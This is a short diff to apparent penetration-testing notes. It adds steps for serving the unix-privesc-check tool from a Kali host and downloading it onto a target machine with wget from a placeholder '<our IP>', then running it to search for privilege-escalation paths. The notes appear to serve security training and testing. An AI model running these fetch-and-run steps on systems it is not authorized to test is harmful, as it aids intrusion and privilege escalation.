@@ -1,6 +1,27 @@
 ## Linux Enumeration
 
+### Automatic Enumeration
+Searching explicitly for privesc opportunities:
+
+On Kali host:
+```bash
+cp /usr/bin/unix-privesc-check/unix-privesc-check .
+python3 -m http.server
+```
+On target machine:
+```bash
+wget http://<our IP>/unix-privesc-check
+```
+```bash
+chmod +x unix-privesc-check
+```
+```bash
+unix-privesc-check standard > output.txt
+```
+
 ### Manual Enumeration
+For fine grained/specific enumeration items see the glossary below. Hopefully a standard privesc check as detailed above should be sufficient, but in case it isn't.
+
 File permissions
 ```bash
 ls -l
